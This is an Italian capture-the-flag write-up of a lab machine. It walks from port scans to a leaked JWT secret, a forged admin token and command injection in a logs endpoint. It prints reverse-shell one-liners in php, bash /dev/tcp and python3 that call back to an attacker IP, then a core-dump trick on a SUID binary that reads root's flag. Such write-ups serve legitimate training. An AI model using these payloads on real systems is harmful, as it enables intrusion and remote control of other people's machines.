10.10.11.120

sudo masscan -p1-65535 10.10.11.120 --rate 1000 --open --banners -e tun0
Discovered open port 22/tcp on 10.10.11.120                                    
Discovered open port 80/tcp on 10.10.11.120                                    
Discovered open port 3000/tcp on 10.10.11.120  

nmap -sC -sV -p22,80,3000 10.10.11.120 

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


sulla porta 3000 c'è un middleware di express, magari viene richiamato dal sito sulla porta 80, si riesce a richiamare aggirando la porta 80? 
magari richiamandolo direttamente si riescono a mandare dati per injection che verrebbero bloccati sulla pagina 80?

sulla porta 80 c'è la presentazione di un API che implementa un'API di autenticazione (Auth API)
è possibile scaricare anche il codice sorgente, usa JWT tokens

studio del codice:
    app.listen(3000, () => console.log("server up and running"));

a quanto pare questa funzionalità di authentication parte (di default ?) sulla porta 3000 quindi anche sulla porta 3000 della macchina potrebbe esserci questo software per autenticazione

DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret

la directory scaricata è una repo github, guardando nella history dei commit c'è stata una modifica al file .env "for security reasons" e infatti la modifica è stata rimuovere il TOKEN_SECRET:

DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE

tra gli esempi della documentazione c'è anche:


  {
	"name": "dasith",
	"email": "root@dasith.works",
	"password": "Kekc8swFgD6zU"
  }


è difficile che questa password venga riutilizzata perchè sta sul sito ma non si può mai sapere quindi meglio tenerla presente


provo ad usare dirb per vedere se ci sono path a cui non posso accedere senza authentication token sia sulla porta 80 che sulla porta 3000
dirb http://dirb 10.10.11.120/





dirb http://dirb 10.10.11.120:3000/


già il path che c'è nella documentazione http://10.10.11.120/api/priv risulta in accedd denied, provoa d accedere a questo path

non mi fa accedere perchè il token non è valido analizzanbdo il codice però vedo che il token valido è legato alla sessione dell'utente quindi in teoria non mi basta avere il token ma devo comunque autenticarmi 
autenticandomi otterrò il token corretto a prescindere

inoltre:

if (name == 'theadmin'){
        res.json({
            creds:{
                role:"admin", 
                username:"theadmin",
                desc : "welcome back admin,"
            }
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})

l'admin ha username "theadmin"

un'altra pagina a cui può accedere solo l'admin è /logs
potrebbero esserci info utili

posso provare a registrare un utente e poi ad accedere, per vedere se ci sono altri info utili sotto /priv (visto che non mi fa accedere con i secret che ho trovato)

{
    "role": {
        "role": "you are normal user",
        "desc": "provaprova"
    }
}

con secret = eJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTg0NTM2ZDQyMjNkZTA0NjI5NTVmNTciLCJuYW1lIjoicHJvdmFwcm92YSIsImVtYWlsIjoicHJvdmFAcHJvdmEuY29tIiwiaWF0IjoxNjM2MDYyMTY4fQ.2cNfAUDG-CDxCcLigqUqCefPV3ZhGHzaxOduJATAVjM

quindi deve esserci prima il login e poi è possibile usare il token.


 const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;

a quanto apre tra l'altro possiamo passare un file direttamente nella richiesta e viene apert
prima però è necessario accedere come theadmin


jwt presenta una vulnerabilità:

https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/

e inoltre è possibile decodificare i token ( https://jwt.io/ ) , quello trovato nella docmentazione corrisponde a:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg 

{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "_id": "6114654d77f9a54e00f05777",
  "name": "theadmin",
  "email": "root@dasith.works",
  "iat": 1628727669
}

per modificare i token: https://token.dev/



fino ad ora non avevo capito il senso del SECRET_TOKEN trovato, quello non è un jwt ma la chiave usada per signing e verifica dei jwt 
infatti creando il token usando l'algoritmo giusto (HSA256) come detto nella documentazione e usando la chiave trovata ottengo un token valido per theadmin:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo

ottenuta mettendo:

{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "_id": "6114654d77f9a54e00f05777",
  "name": "theadmin",
  "email": "root@dasith.works",
  "iat": 1628727669
}
Signing key= gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE

quindi ora posso accedere come admin.

provo ad accedere a logs (prima senza inserire nessun file): http://10.10.11.120:3000/api/logs

{
    "killed": false,
    "code": 128,
    "signal": null,
    "cmd": "git log --oneline undefined"
}

visto che il file viene letto tramite: 

const getLogs = `git log --oneline ${file}`;

senza che venga controllato l'input si può provare ad ottenere reverse shell tramite cmd injection

curl 'http://10.10.11.120:3000/api/logs?file=%26%26%20id' \
    -H 'Accept: application/json' \
    -H 'Connection: keep-alive' \
    -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo'

mi permette di ottenere l'id (che è dasith) (%26%26%20id   è  && id    url encoded)

&& php -r '$sock=fsockopen("10.10.16.3",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
%26%26%20php%20-r%20%27%24sock%3Dfsockopen(%2210.10.16.3%22%2C1234)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27

&& /bin/bash -l > /dev/tcp/10.10.16.3/1234 0<&1 2>&1
%26%26%20%2Fbin%2Fbash%20-l%20%3E%20%2Fdev%2Ftcp%2F10.10.16.3%2F1234%200%3C%261%202%3E%261


provando a mandare vari comandi (come ad esempio php --version) per capire cosa c'è installato, l'unico che va a buon fine è python3 quinid mi server una shell one-liner con python3:

&&  python3 -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

e infatti inviando la richiesta va a buon fine e ho una reverse shell.

$ cat user.txt
7532ef370512a3af29eddc10f19e5963


id
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)



dopo varie enumerazioni ho provato a trovare i files con suid

find / -perm -u=s -type f 2>/dev/null

e ne ho trovato uno interessante che sembra non essere il binary di default:

/opt/count

facendo varie prove funziona come count ma salva i risultati in un file 
però non parte subito, aspetta prima come se fosse in attesa del nome del file anche se viene passato da line adi comando
richiede due valori all'interno della "console" che si apre
ad esempio una directory e un file

il primo parametro è la directory/file di cui fare count, il secondo è y per fargli scrivere in un file l'output

prctl(PR_SET_DUMPABLE, SUID_DUMP_USER)

rende il programma dumpable anche dopo un cambio di uid

per generare il core dump basta mandare un segnale di kill che ha come gestione di default la creazione del core dump:

kill -11 3469

ora il dump si trova sotto /var/crash           ((se fgestito automaticamente da apport come solitamente succede su linux) (per vedere chi gestisc eil dump cat /proc/sys/kernel/core_pattern) )

può essere analizzato facilmente con gdb:

apport-unpack _opt_count.1000.crash /home/dasith/coredump
cd /home/dasith/coredump
gdb /opt/count CoreDump


non serve analizzarlo con gdb, se lo stoppo dopo aver letto root/root.txt troverò il contenuto nel file nel core dump facendo semplicemente cat CoreDump
root.txt:
33953b951c1cc9a1b181282c46e3cb6a











                                             